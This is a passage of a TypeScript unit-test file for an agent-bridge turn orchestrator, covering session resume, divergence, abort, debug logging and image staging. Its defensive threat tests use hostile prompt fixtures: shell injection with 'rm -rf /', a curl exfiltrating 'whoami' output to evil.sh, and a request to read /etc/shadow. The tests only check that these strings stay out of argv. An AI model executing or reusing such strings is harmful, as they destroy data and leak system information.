/**
 * Unit tests for the turn-orchestration module (specs R3, R7, R8): the
 * divergence decision (fresh vs linear resume vs hash-less adopt-once),
 * the ⟲ diverged notice signal, resume-once on the timeout family with a
 * repeat-failure terminal carrying the run.log path, abort (SIGTERM the
 * tapped child, preserve the conversationId, TurnAborted), session-key
 * derivation (options.sessionId ?? cwd), and the spawn-boundary threat
 * rows: (a) a hostile prompt never reaches argv (promptViaStdin seam),
 * (b) workdir authority — only deps.workdir ?? options.cwd ?? process.cwd()
 * ever becomes the child's cwd / --add-dir, never anything derived from
 * the prompt. Runs a fake spawn (ChildProcess stand-in with a stdin
 * capture) against the REAL engine runAgyStream, with a file-backed
 * session store in a tmp dir.
 */
import { describe, expect, test } from "bun:test";
import { EventEmitter } from "node:events";
import { Readable, Writable } from "node:stream";
import { createHash } from "node:crypto";
import { existsSync, mkdirSync, readFileSync, readdirSync, symlinkSync, utimesSync, writeFileSync } from "node:fs";
import { mkdtemp } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import type { Context, Message, SimpleStreamOptions, UserMessage } from "@earendil-works/pi-ai";
import { messageHashes } from "agy-bridge-engine";
import { createDebugLogger } from "../src/debug";
import { DIVERGED_NOTICE, RETRY_NOTICE, runTurn, TurnAborted, TurnError, type TurnDeps, type TurnRequest } from "../src/turn";
import { openSessionStore } from "../src/session-store";

// --- fixtures -----------------------------------------------------------------

function userMsg(content: UserMessage["content"], timestamp = 1): UserMessage {
	return { role: "user", content, timestamp };
}

function assistantMsg(text: string): Message {
	return {
		role: "assistant",
		content: [{ type: "text", text }],
		api: "agy-stream-json",
		provider: "agy",
		model: "default",
		usage: {
			input: 0,
			output: 0,
			cacheRead: 0,
			cacheWrite: 0,
			totalTokens: 0,
			cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, total: 0 },
		},
		stopReason: "stop",
		timestamp: 2,
	};
}

const SUCCESS = (conversationId: string, response = "all done") => ({
	event: "result",
	result: { conversation_id: conversationId, status: "SUCCESS", response },
});

/** Minimal ChildProcess stand-in: scripted NDJSON lines, optional stdin capture, then exit/close. */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function fakeChild(opts: { lines?: unknown[]; exit?: number | null; hold?: boolean; stdin?: boolean; rawLines?: string[] }) {
	// eslint-disable-next-line @typescript-eslint/no-explicit-any
	const child: any = new EventEmitter();
	child.stdout = new Readable({ read() {} });
	child.stderr = new Readable({ read() {} });
	if (opts.stdin) {
		const chunks: Buffer[] = [];
		child.stdinChunks = chunks;
		child.stdin = new Writable({
			write(chunk: Buffer, _enc: string, cb: (err?: Error | null) => void) {
				chunks.push(Buffer.from(chunk));
				cb();
			},
		});
	}
	child.killed = false;
	child.kill = () => {
		child.killed = true;
		queueMicrotask(() => child.emit("close", null, "SIGTERM"));
		return true;
	};
	for (const line of opts.lines ?? []) {
		child.stdout.push(Buffer.from(`${JSON.stringify(line)}\n`));
	}
	for (const raw of opts.rawLines ?? []) {
		child.stdout.push(Buffer.from(`${raw}\n`));
	}
	if (!opts.hold) setTimeout(() => child.emit("close", opts.exit ?? 0, null), 10);
	return child;
}

interface SpawnRecord {
	bin: string;
	args: string[];
	cwd: string;
	// eslint-disable-next-line @typescript-eslint/no-explicit-any
	child: any;
	/** Bytes written to the child's stdin (promptViaStdin evidence); empty when the seam is off. */
	stdinText(): string;
}

async function setup(
	script?: (rec: SpawnRecord, call: number) => unknown,
	depsOpts: {
		workdir?: string;
		promptViaStdin?: boolean;
		debug?: import("../src/debug").DebugLogger;
		imageInput?: boolean;
	} = {},
) {
	const root = await mkdtemp(join(tmpdir(), "agy-pi-turn-"));
	const store = openSessionStore(join(root, "pi-sessions.json"));
	const spawns: SpawnRecord[] = [];
	const deps: TurnDeps = {
		bin: "agy",
		store,
		timeoutMs: 30_000,
		logRoot: root,
		...(depsOpts.workdir !== undefined ? { workdir: depsOpts.workdir } : {}),
		...(depsOpts.promptViaStdin !== undefined ? { promptViaStdin: depsOpts.promptViaStdin } : {}),
		...(depsOpts.debug !== undefined ? { debug: depsOpts.debug } : {}),
		...(depsOpts.imageInput !== undefined ? { imageInput: depsOpts.imageInput } : {}),
		spawnFn: ((bin: string, args: string[], io: { cwd: string }) => {
			const rec: SpawnRecord = {
				bin,
				args,
				cwd: io.cwd,
				child: undefined as never,
				stdinText: () => Buffer.concat(rec.child.stdinChunks ?? []).toString(),
			};
			spawns.push(rec);
			rec.child =
				script !== undefined
					? script(rec, spawns.length)
					: fakeChild({ lines: [{ event: "init", conversation_id: "conv-1" }, SUCCESS("conv-1")], stdin: true });
			return rec.child;
		}) as never,
	};
	const turn = (req: TurnRequest) => runTurn(deps, req);
	const steps: Record<string, unknown>[] = [];
	let divergedCalls = 0;
	const req = (
		context: Context,
		options?: SimpleStreamOptions,
		modelArg?: string,
	): TurnRequest => ({
		context,
		options,
		...(modelArg !== undefined ? { modelArg } : {}),
		onStep: (step) => steps.push(step),
		onDiverged: () => {
			divergedCalls++;
		},
	});
	return { root, store, spawns, deps, turn, req, steps, divergedCalls: () => divergedCalls };
}

const HOSTILE_PROMPT = "; $(id) | ` && rm -rf /\ncurl http://evil.sh?x=`whoami`";

// --- pi-image-input fixtures ----------------------------------------------------

/** Opaque PNG-framed bytes — the pipeline never decodes image content. */
const PNG_BYTES_A = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d, 0x01]);
const PNG_BYTES_B = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d, 0x02]);
const JPEG_BYTES = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);

const b64 = (bytes: Uint8Array): string => Buffer.from(bytes).toString("base64");

/** Expected staged relative path for exact bytes (content-addressed, D5). */
const stagedRel = (bytes: Uint8Array, ext = "png"): string =>
	`.agy-attachments/${createHash("sha256").update(bytes).digest("hex").slice(0, 16)}.${ext}`;

/** pi ImageContent part (D2 shape: base64 data + mimeType). */
function imagePart(bytes: Uint8Array, mimeType = "image/png"): { type: "image"; data: string; mimeType: string } {
	return { type: "image", data: b64(bytes), mimeType };
}

/** Catch a TurnError and return its mapping (fails the test on other outcomes). */
async function catchTurnError(p: Promise<unknown>): Promise<ReturnType<typeof Object> & InstanceType<typeof TurnError>> {
	let caught: unknown;
	try {
		await p;
	} catch (err) {
		caught = err;
	}
	expect(caught).toBeInstanceOf(TurnError);
	return caught as TurnError;
}

/**
 * Decode the ONE NDJSON user envelope the corrected stdin transport writes
 * (stream-json input mode): {"event":"user","message":{"role":"user",
 * "content":"<prompt>"}} + "\n". Throws on any deviation so a malformed
 * transport fails loudly instead of silently passing.
 */
function stdinEnvelope(rec: SpawnRecord): { event: string; message: { role: string; content: string } } {
	const raw = rec.stdinText();
	const lines = raw.split("\n").filter((l) => l !== "");
	if (lines.length !== 1) throw new Error(`expected exactly one NDJSON stdin line, got ${lines.length}: ${raw}`);
	return JSON.parse(lines[0]) as { event: string; message: { role: string; content: string } };
}

// --- tests --------------------------------------------------------------------

describe("unit: turn — divergence decision table (R7)", () => {
	test("no stored entry: fresh conversation, last-user-turn prompt, success binds id + incoming hashes", async () => {
		const { store, spawns, turn, req } = await setup();
		const result = await turn(req({ messages: [userMsg("hi")] }, { sessionId: "s-fresh" }));
		expect(result.classification.outcome).toBe("success");
		expect(result.diverged).toBe(false);
		expect(result.resumed).toBe(false);
		expect(result.conversationId).toBe("conv-1");
		expect(result.prompt).toBe("hi");
		expect(spawns[0].args).not.toContain("--conversation");
		expect(await store.getEntry("s-fresh")).toEqual({
			conversationId: "conv-1",
			hashes: messageHashes([{ role: "user", content: "hi" }]),
		});
		expect(existsSync(result.logPath)).toBe(true);
	});

	test("stored prefix baseline: linear continuation resumes via --conversation, no system text", async () => {
		const { store, spawns, turn, req } = await setup();
		await store.bind(
			"s-lin",
			"conv-old",
			messageHashes([{ role: "user", content: "first" }]),
		);
		const context: Context = {
			systemPrompt: "SYS",
			messages: [userMsg("first"), assistantMsg("reply"), userMsg("second")],
		};
		const result = await turn(req(context, { sessionId: "s-lin" }));
		expect(result.diverged).toBe(false);
		expect(spawns[0].args[spawns[0].args.indexOf("--conversation") + 1]).toBe("conv-old");
		expect(result.prompt).toBe("second");
		expect(result.prompt).not.toContain("SYS");
		expect(await store.get("s-lin")).toBe("conv-1");
	});

	test("hash-less entry: adopted once via --conversation, then the incoming hashes become the baseline", async () => {
		const { store, spawns, turn, req } = await setup();
		await store.bind("s-adopt", "conv-old"); // pre-upgrade entry: no hashes
		const result = await turn(req({ systemPrompt: "SYS", messages: [userMsg("next")] }, { sessionId: "s-adopt" }));
		expect(result.diverged).toBe(false);
		expect(spawns[0].args[spawns[0].args.indexOf("--conversation") + 1]).toBe("conv-old");
		expect(result.prompt).toBe("next");
		expect(await store.getEntry("s-adopt")).toEqual({
			conversationId: "conv-1",
			hashes: messageHashes([{ role: "user", content: "next" }]),
		});
	});

	test("THREAT (c) non-prefix baseline: onDiverged fires once, fresh seeded conversation (no --conversation), ⟲ never enters the prompt", async () => {
		const { store, spawns, turn, req, divergedCalls } = await setup();
		await store.bind("s-div", "conv-stale", ["deadbeef"]);
		const context: Context = {
			systemPrompt: "SYS-DIV",
			messages: [userMsg("old question"), assistantMsg("old answer"), userMsg("new question")],
		};
		const result = await turn(req(context, { sessionId: "s-div" }));
		expect(divergedCalls()).toBe(1);
		expect(result.diverged).toBe(true);
		expect(spawns[0].args).not.toContain("--conversation");
		const sysAt = result.prompt.indexOf("SYS-DIV");
		const seedAt = result.prompt.indexOf("User: old question");
		const userAt = result.prompt.indexOf("new question");
		expect(sysAt).toBeGreaterThanOrEqual(0);
		expect(seedAt).toBeGreaterThan(sysAt);
		expect(userAt).toBeGreaterThan(seedAt);
		// The ⟲ line is a HOST status notice (stream-simple renders it as a
		// thinking delta); it must never leak into the forwarded prompt.
		expect(result.prompt).not.toContain("⟲");
		expect(await store.getEntry("s-div")).toEqual({
			conversationId: "conv-1",
			hashes: messageHashes([
				{ role: "user", content: "old question" },
				{ role: "assistant", content: [{ type: "text", text: "old answer" }] },
				{ role: "user", content: "new question" },
			]),
		});
		// The notice stream-simple consumes is the exported constant, pinned here.
		expect(DIVERGED_NOTICE).toBe("⟲ history diverged — new agy conversation seeded\n");
	});
});

describe("unit: turn — spawn boundary threat rows", () => {
	test("THREAT (a) promptViaStdin: hostile prompt NEVER reaches argv; argv identical to a benign turn; stdin carries the exact bytes", async () => {
		const { spawns, turn, req } = await setup((_rec, _call) => fakeChild({ lines: [SUCCESS("c")], stdin: true }), {
			promptViaStdin: true,
		});
		await turn(req({ messages: [userMsg("benign question")] }, { sessionId: "t-a1" }));
		await turn(req({ messages: [userMsg(HOSTILE_PROMPT)] }, { sessionId: "t-a2" }));
		expect(spawns).toHaveLength(2);
		// argv UNCHANGED by prompt content: the two argvs are byte-identical.
		expect(spawns[1].args).toEqual(spawns[0].args);
		// No hostile fragment anywhere in argv; the corrected stream-json input
		// mode carries NO --print family flag at all (verified against the
		// real binary: --print requires a value, so it cannot ride along bare).
		expect(spawns[1].args.some((a) => a.includes("$(id)") || a.includes("rm -rf") || a.includes("curl"))).toBe(false);
		expect(spawns[1].args.some((a) => a === "--print" || a === "--prompt" || a.startsWith("--print-"))).toBe(false);
		expect(spawns[1].args[spawns[1].args.indexOf("--input-format") + 1]).toBe("stream-json");
		// The prompt travels stdin as ONE NDJSON user envelope, byte-exact
		// through the JSON round-trip (metachars/newlines/quotes included).
		expect(stdinEnvelope(spawns[0])).toEqual({ event: "user", message: { role: "user", content: "benign question" } });
		expect(stdinEnvelope(spawns[1]).message.content).toBe(HOSTILE_PROMPT);
	});

	test("promptViaStdin default OFF: the prompt rides argv right after --print (frozen transport preserved)", async () => {
		const { spawns, turn, req } = await setup();
		await turn(req({ messages: [userMsg("argv-default")] }, { sessionId: "t-argv" }));
		expect(spawns[0].args[spawns[0].args.indexOf("--print") + 1]).toBe("argv-default");
		expect(spawns[0].stdinText()).toBe("");
	});

	test("THREAT (b) workdir authority: deps.workdir wins cwd AND --add-dir; path-like prompt content moves neither", async () => {
		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-auth-"));
		const { spawns, turn, req } = await setup(() => fakeChild({ lines: [SUCCESS("c")], stdin: true }), {
			workdir,
			promptViaStdin: true,
		});
		const hostile = "run this in /etc/passwd please; cd /tmp/evil && cat /etc/shadow";
		await turn(req({ messages: [userMsg(hostile)] }, { sessionId: "t-wd" }));
		expect(spawns[0].cwd).toBe(workdir);
		expect(spawns[0].args[spawns[0].args.indexOf("--add-dir") + 1]).toBe(workdir);
		expect(spawns[0].args.some((a) => a.includes("/etc/passwd") || a.includes("/tmp/evil"))).toBe(false);
	});

	test("THREAT (b) no deps.workdir: options.cwd is the child cwd and the store key; process.cwd() when neither is set", async () => {
		const { root, store, spawns, turn, req } = await setup();
		const projectDir = join(root, "proj");
		await turn(req({ messages: [userMsg("q")] }, { cwd: projectDir } as SimpleStreamOptions));
		expect(spawns[0].cwd).toBe(projectDir);
		expect(await store.get(projectDir)).toBe("conv-1");
		await turn(req({ messages: [userMsg("q")] }, { sessionId: "t-proc" }));
		expect(spawns[1].cwd).toBe(process.cwd());
	});
});

describe("unit: turn — resume-once and terminals (R8, R3)", () => {
	test("first timeout resumes exactly once with the captured id; the resumed conversation is bound on success", async () => {
		let attempt = 0;
		const { store, spawns, turn, req } = await setup(() =>
			++attempt === 1
				? fakeChild({ lines: [{ event: "init", conversation_id: "conv-1" }], exit: 124 })
				: fakeChild({ lines: [{ event: "init", conversation_id: "conv-2" }, SUCCESS("conv-2")], stdin: true }),
		);
		const result = await turn(req({ messages: [userMsg("q")] }, { sessionId: "s-resume" }));
		expect(spawns).toHaveLength(2);
		expect(spawns[1].args[spawns[1].args.indexOf("--conversation") + 1]).toBe("conv-1");
		expect(result.resumed).toBe(true);
		expect(result.classification.outcome).toBe("success");
		expect(result.conversationId).toBe("conv-2");
		expect(await store.get("s-resume")).toBe("conv-2");
	});

	test("THREAT (d) repeat timeout is terminal: TurnError mapping carries the run.log path; the store is rebound fresh", async () => {
		const { store, spawns, turn, req } = await setup(() =>
			fakeChild({ lines: [{ event: "init", conversation_id: "conv-x" }], exit: 124 }),
		);
		let caught: unknown;
		try {
			await turn(req({ messages: [userMsg("q")] }, { sessionId: "s-twice" }));
		} catch (err) {
			caught = err;
		}
		expect(caught).toBeInstanceOf(TurnError);
		const err = caught as TurnError;
		expect(err.mapping.finalize).toBe("error");
		expect(err.mapping.resumeEligible).toBe(false);
		expect(err.mapping.message).toContain("timed out");
		expect(err.mapping.message).toMatch(/Full log: .+run\.log/);
		expect(spawns).toHaveLength(2);
		expect(spawns[1].args[spawns[1].args.indexOf("--conversation") + 1]).toBe("conv-x");
		expect(await store.getEntry("s-twice")).toBeUndefined();
	});

	test("task failure: TurnError with agy's detail text and the log path; the store stays unbound", async () => {
		const { store, turn, req } = await setup(() =>
			fakeChild({ lines: [{ event: "result", result: { status: "ERROR", error: "agy exploded" } }], exit: 1 }),
		);
		let caught: unknown;
		try {
			await turn(req({ messages: [userMsg("q")] }, { sessionId: "s-fail" }));
		} catch (err) {
			caught = err;
		}
		expect(caught).toBeInstanceOf(TurnError);
		const err = caught as TurnError;
		expect(err.mapping.message).toContain("agy exploded");
		expect(err.mapping.message).toMatch(/run\.log/);
		expect(await store.getEntry("s-fail")).toBeUndefined();
	});

	test("abort mid-run: child SIGTERMed, tapped conversationId bound, TurnAborted thrown", async () => {
		const controller = new AbortController();
		const { store, spawns, turn, req } = await setup(() =>
			fakeChild({ lines: [{ event: "init", conversation_id: "conv-ab" }], hold: true, stdin: true }),
		);
		const p = turn(req({ messages: [userMsg("q")] }, { sessionId: "s-ab", signal: controller.signal }));
		setTimeout(() => controller.abort(), 25);
		await expect(p).rejects.toBeInstanceOf(TurnAborted);
		expect(spawns[0].child.killed).toBe(true);
		expect(await store.get("s-ab")).toBe("conv-ab");
	});

	test("abort before the run: TurnAborted, zero spawns, store untouched", async () => {
		const { store, spawns, turn, req } = await setup(() => {
			throw new Error("must not spawn");
		});
		const controller = new AbortController();
		controller.abort();
		await expect(
			turn(req({ messages: [userMsg("q")] }, { sessionId: "s-pre", signal: controller.signal })),
		).rejects.toBeInstanceOf(TurnAborted);
		expect(spawns).toHaveLength(0);
		expect(await store.getEntry("s-pre")).toBeUndefined();
	});
});

describe("unit: turn — live hooks and model plumbing", () => {
	test("onStep surfaces every step_update payload object in arrival order", async () => {
		const { turn, req, steps } = await setup(() =>
			fakeChild({
				lines: [
					{ event: "step_update", step_update: { step_type: "tool", state: "ACTIVE", tool_name: "ls" } },
					{ event: "step_update", step_update: { step_type: "agent_response", state: "DONE", duration_seconds: 1.5 } },
					{ event: "result", result: { conversation_id: "c", status: "SUCCESS", response: "ok" } },
				],
				stdin: true,
			}),
		);
		await turn(req({ messages: [userMsg("q")] }, { sessionId: "s-steps" }));
		expect(steps).toEqual([
			{ step_type: "tool", state: "ACTIVE", tool_name: "ls" },
			{ step_type: "agent_response", state: "DONE", duration_seconds: 1.5 },
		]);
	});

	test("modelArg forwards as --model; undefined omits the flag entirely", async () => {
		const { spawns, turn, req } = await setup(() => fakeChild({ lines: [SUCCESS("c")], stdin: true }));
		await turn(req({ messages: [userMsg("q")] }, { sessionId: "s-m1" }, "gemini-3.8-flash-high"));
		await turn(req({ messages: [userMsg("q")] }, { sessionId: "s-m2" }));
		expect(spawns[0].args[spawns[0].args.indexOf("--model") + 1]).toBe("gemini-3.8-flash-high");
		expect(spawns[1].args).not.toContain("--model");
	});

	test("run.log lands in a fresh agy-run-* scratch dir under logRoot, never the child cwd", async () => {
		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-turn-wd-"));
		const { root, turn, req } = await setup(() => fakeChild({ lines: [SUCCESS("c")], stdin: true }), { workdir });
		const result = await turn(req({ messages: [userMsg("q")] }, { sessionId: "s-log" }));
		const scratch = readdirSync(root).filter((d) => d.startsWith("agy-run-"));
		expect(scratch.length).toBeGreaterThanOrEqual(1);
		expect(result.logPath.startsWith(join(root, scratch[0]))).toBe(true);
		expect(existsSync(join(root, scratch[0], "run.log"))).toBe(true);
		expect(readdirSync(workdir)).toEqual([]);
	});
});

// --- v0.2 S3: additive mode passthrough (R5, D4) ---

describe("unit: turn — mode passthrough (v0.2 R5, D4)", () => {
	test("req.mode reaches the engine argv as --mode <v> (AskAgy paths only; both values)", async () => {
		const { spawns, turn } = await setup(() => fakeChild({ lines: [SUCCESS("c")], stdin: true }), {
			promptViaStdin: true,
		});
		const modeReq = (mode?: "plan" | "accept-edits"): TurnRequest => ({
			context: { messages: [userMsg("q")] },
			options: { sessionId: "s-mode" },
			...(mode !== undefined ? { mode } : {}),
		});
		await turn(modeReq());
		await turn(modeReq("plan"));
		await turn(modeReq("accept-edits"));
		expect(spawns).toHaveLength(3);
		expect(spawns[0].args).not.toContain("--mode"); // unset → v0.1 argv
		expect(spawns[1].args[spawns[1].args.indexOf("--mode") + 1]).toBe("plan");
		expect(spawns[2].args[spawns[2].args.indexOf("--mode") + 1]).toBe("accept-edits");
	});

	test("THREAT (e) provider path: no req.mode → argv byte-identical to the v0.1 D4 pin (no --mode anywhere)", async () => {
		const { spawns, turn } = await setup(() => fakeChild({ lines: [SUCCESS("c")], stdin: true }), {
			promptViaStdin: true,
		});
		await turn({ context: { messages: [userMsg("q")] }, options: { sessionId: "s-d4" } });
		expect(spawns).toHaveLength(1);
		expect(spawns[0].args).toEqual([
			"--input-format",
			"stream-json",
			"--output-format",
			"stream-json",
			"--add-dir",
			process.cwd(),
			"--dangerously-skip-permissions",
		]);
	});

	test("abort mid-stream regression WITH mode set: SIGTERM + tapped conversationId persisted + --mode still in argv", async () => {
		const controller = new AbortController();
		const { store, spawns, turn } = await setup(() =>
			fakeChild({ lines: [{ event: "init", conversation_id: "conv-ab" }], hold: true, stdin: true }),
		);
		const p = turn({
			context: { messages: [userMsg("q")] },
			options: { sessionId: "s-ab-mode", signal: controller.signal },
			mode: "plan",
		});
		setTimeout(() => controller.abort(), 25);
		await expect(p).rejects.toBeInstanceOf(TurnAborted);
		expect(spawns).toHaveLength(1);
		expect(spawns[0].child.killed).toBe(true);
		expect(spawns[0].args[spawns[0].args.indexOf("--mode") + 1]).toBe("plan");
		expect(await store.get("s-ab-mode")).toBe("conv-ab");
	});
});

// --- v0.2 R11: opt-in debug facts (tasks 4.3/4.4, design D11) -------------------

let debugFileSeq = 0;

describe("v0.2 R11: turn debug facts (injected sink — ids, codes, durations only)", () => {
	/** Fresh debug sink bound to a unique tmp file, handed to setup as a dep. */
	function sink() {
		const logPath = join(tmpdir(), `agy-pi-turn-dbg-${process.pid}-${debugFileSeq++}.log`);
		const debug = createDebugLogger({
			env: { AGY_BRIDGE_DEBUG: "1", AGY_BRIDGE_DEBUG_PATH: logPath },
			stateDir: tmpdir(),
		});
		return { debug, logPath };
	}

	function parseLines(logPath: string): Record<string, unknown>[] {
		return readFileSync(logPath, "utf8")
			.split("\n")
			.filter((l) => l !== "")
			.map((l) => JSON.parse(l) as Record<string, unknown>);
	}

	test("debug-enabled turn appends turn_start/classified/turn_end with key, conversationId, classification, durationMs", async () => {
		const { debug, logPath } = sink();
		const { deps, req } = await setup(undefined, { debug });
		await runTurn(deps, req({ messages: [userMsg("hi")] }, { sessionId: "s-dbg" }));
		const lines = parseLines(logPath);
		const events = lines.map((l) => l["event"]);
		expect(events).toContain("turn_start");
		expect(events).toContain("classified");
		expect(events).toContain("turn_end");
		const start = lines.find((l) => l["event"] === "turn_start");
		expect(start?.["key"]).toBe("s-dbg");
		const classified = lines.find((l) => l["event"] === "classified");
		expect(classified?.["classification"]).toBe("success");
		expect(classified?.["conversationId"]).toBe("conv-1");
		expect(typeof classified?.["durationMs"]).toBe("number");
		const end = lines.find((l) => l["event"] === "turn_end");
		expect(end?.["classification"]).toBe("success");
		expect(end?.["conversationId"]).toBe("conv-1");
		expect(typeof end?.["durationMs"]).toBe("number");
	});

	test("the prompt body NEVER reaches the debug log (D11 hard rule, sentinel scan)", async () => {
		const { debug, logPath } = sink();
		const { deps, req } = await setup(undefined, { debug });
		const sentinel = "SENTINEL-PROMPT-9f3ac2 top secret instructions";
		await runTurn(deps, req({ messages: [userMsg(sentinel)] }, { sessionId: "s-sentinel" }));
		const raw = readFileSync(logPath, "utf8");
		expect(raw.length).toBeGreaterThan(0); // events WERE logged...
		expect(raw).not.toContain("SENTINEL-PROMPT-9f3ac2"); // ...but never the prompt
		expect(raw).not.toContain("top secret instructions");
	});

	test("debug disabled (env unset): a full turn produces zero debug writes", async () => {
		const stateDir = await mkdtemp(join(tmpdir(), "agy-pi-turn-dbg-off-"));
		const { deps, req } = await setup(undefined, { debug: createDebugLogger({ env: {}, stateDir }) });
		await runTurn(deps, req({ messages: [userMsg("hi")] }, { sessionId: "s-off" }));
		expect(existsSync(join(stateDir, "debug.log"))).toBe(false);
	});
});

// --- v0.2 S5 R8/D7: resume-once retry hook ----------------------------------------

describe("v0.2 R8: onRetry hook (D7)", () => {
	test("onRetry fires exactly once AFTER attempt 1 resolves and BEFORE the resume attempt spawns (ordering pin)", async () => {
		let attempt = 0;
		const order: string[] = [];
		const { spawns, turn } = await setup((_rec, call) => {
			order.push(`spawn-${call}`);
			return ++attempt === 1
				? fakeChild({ lines: [{ event: "init", conversation_id: "conv-1" }], exit: 124 })
				: fakeChild({ lines: [{ event: "init", conversation_id: "conv-2" }, SUCCESS("conv-2")], stdin: true });
		});
		let retries = 0;
		await turn({
			context: { messages: [userMsg("q")] },
			options: { sessionId: "s-onretry" },
			onRetry: () => {
				retries++;
				order.push("onRetry");
			},
		});
		expect(spawns).toHaveLength(2);
		expect(retries).toBe(1);
		expect(order).toEqual(["spawn-1", "onRetry", "spawn-2"]);
	});

	test("RETRY_NOTICE text pinned — stream-simple renders it as the retry thinking delta (matches DIVERGED_NOTICE ⟲ style)", () => {
		expect(RETRY_NOTICE).toBe("⟲ turn timed out — resuming agy conversation\n");
	});

	test("success on the first attempt: onRetry never fires", async () => {
		let retries = 0;
		const { spawns, turn } = await setup();
		await turn({
			context: { messages: [userMsg("q")] },
			options: { sessionId: "s-noretry" },
			onRetry: () => retries++,
		});
		expect(spawns).toHaveLength(1);
		expect(retries).toBe(0);
	});
});

// --- pi-image-input R1: disabled fail-safe (D4/D5) ----------------------------------

describe("pi-image-input R1: disabled gating (turn)", () => {
	test("disabled default + image in the LAST user turn: TurnError names both config paths and the text alternative; nothing staged, no spawn", async () => {
		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-gate-"));
		const { spawns, turn, req } = await setup(() => {
			throw new Error("must not spawn");
		}, { workdir });
		const err = await catchTurnError(
			turn(
				req(
					{ messages: [userMsg([{ type: "text", text: "what is this" }, imagePart(PNG_BYTES_A)])] },
					{ sessionId: "s-gate" },
				),
			),
		);
		// D4 mapping: terminal, non-retryable, non-resume-eligible.
		expect(err.mapping.finalize).toBe("error");
		expect(err.mapping.retryable).toBe(false);
		expect(err.mapping.resumeEligible).toBe(false);
		// Actionable message: BOTH pi config paths + the text alternative.
		expect(err.mapping.message).toContain(".pi/agy-bridge.json");
		expect(err.mapping.message).toContain("~/.pi/agent/agy-bridge.json");
		expect(err.mapping.message).toMatch(/describe.*image.*text|text instead/i);
		// Spec R1: nothing MAY be staged and the agent MUST NOT be spawned.
		expect(spawns).toHaveLength(0);
		expect(existsSync(join(workdir, ".agy-attachments"))).toBe(false);
	});

	test("explicit imageInput: false behaves identically to the absent flag (triangulation)", async () => {
		const { spawns, turn, req } = await setup(() => {
			throw new Error("must not spawn");
		}, { imageInput: false });
		const err = await catchTurnError(turn(req({ messages: [userMsg([imagePart(PNG_BYTES_A)])] }, { sessionId: "s-gate-f" })));
		expect(err.mapping.finalize).toBe("error");
		expect(err.mapping.message).toContain(".pi/agy-bridge.json");
		expect(spawns).toHaveLength(0);
	});

	test("disabled + TEXT-only turn: no gate trip — the turn runs and succeeds normally", async () => {
		const { spawns, turn, req } = await setup();
		const result = await turn(req({ messages: [userMsg("plain question")] }, { sessionId: "s-gate-text" }));
		expect(result.classification.outcome).toBe("success");
		expect(spawns).toHaveLength(1);
	});

	test("disabled + image only in an EARLIER turn: proceeds (the gate is last-user-turn scoped, matching extraction)", async () => {
		const { spawns, turn, req } = await setup();
		const context: Context = {
			messages: [userMsg([imagePart(PNG_BYTES_A)]), assistantMsg("prior answer"), userMsg("follow-up text")],
		};
		const result = await turn(req(context, { sessionId: "s-gate-hist" }));
		expect(result.classification.outcome).toBe("success");
		expect(spawns).toHaveLength(1);
		// The historical image follows the engine's drop-by-design path (seed
		// placeholder), never the rejection path.
		expect(result.prompt).toBe("follow-up text");
	});
});

// --- pi-image-input R2–R4: extraction, staging, directive, cloned context (D5) -------

describe("pi-image-input R2–R4: extraction/staging/directive (turn)", () => {
	test("enabled + text+image turn: stages exact bytes under a content-derived name; directive prepended to the prompt; RAW hashes bound", async () => {
		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-stage-"));
		const { store, spawns, turn, req } = await setup(
			() => fakeChild({ lines: [{ event: "init", conversation_id: "c-img" }, SUCCESS("c-img")], stdin: true }),
			{
				workdir,
				imageInput: true,
			},
		);
		const rawContent = [{ type: "text" as const, text: "what is this" }, imagePart(PNG_BYTES_A)];
		const result = await turn(
			req({ messages: [userMsg(rawContent)] }, { sessionId: "s-img1" }),
		);
		expect(result.classification.outcome).toBe("success");
		// R2: one image extracted with its bytes and media type → staged.
		const rel = stagedRel(PNG_BYTES_A);
		expect(result.stagedAttachments).toEqual([rel]);
		const stagedAbs = join(workdir, rel);
		expect(existsSync(stagedAbs)).toBe(true);
		expect(new Uint8Array(readFileSync(stagedAbs))).toEqual(PNG_BYTES_A);
		// R4: the deterministic directive is PREPENDED to the mapped prompt.
		expect(result.prompt).toBe(
			`[Attached user image: ${rel}]\nPlease inspect each attached image above with view_file before responding.\n\nwhat is this`,
		);
		// Spawned with the directive-carrying prompt and the workdir authority.
		expect(spawns).toHaveLength(1);
		expect(spawns[0].args[spawns[0].args.indexOf("--print") + 1]).toBe(result.prompt);
		expect(spawns[0].cwd).toBe(workdir);
		// D5: the baseline hashes the RAW incoming array (image included) —
		// same visible thread → same divergence identity, image or not.
		expect(await store.getEntry("s-img1")).toEqual({
			conversationId: "c-img",
			hashes: messageHashes([{ role: "user", content: rawContent }]),
		});
		// R6 (inspection feedback): staged but not yet inspected.
		expect(result.attachmentsInspected).toBe(false);
	});

	test("two images stage under distinct content-derived refs; the directive names BOTH (spec staging scenario)", async () => {
		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-stage2-"));
		const { turn, req } = await setup(() => fakeChild({ lines: [SUCCESS("c-2img")], stdin: true }), {
			workdir,
			imageInput: true,
		});
		const result = await turn(
			req(
				{
					messages: [
						userMsg([imagePart(PNG_BYTES_A), { type: "text", text: "compare these" }, imagePart(PNG_BYTES_B)]),
					],
				},
				{ sessionId: "s-img2" },
			),
		);
		const relA = stagedRel(PNG_BYTES_A);
		const relB = stagedRel(PNG_BYTES_B);
		expect(relA).not.toBe(relB);
		expect(result.stagedAttachments).toEqual([relA, relB]);
		expect(result.prompt).toContain(`[Attached user image: ${relA}]`);
		expect(result.prompt).toContain(`[Attached user image: ${relB}]`);
		expect(result.prompt).toContain("Please inspect each attached image above with view_file before responding.");
		expect(result.prompt).toContain("compare these");
	});

	test("image-only turn (no text parts): still stages, prompt is the directive alone, turn succeeds", async () => {
		const workdir = await mkdtemp(join(tmpdir(), "agy-pi-only-"));
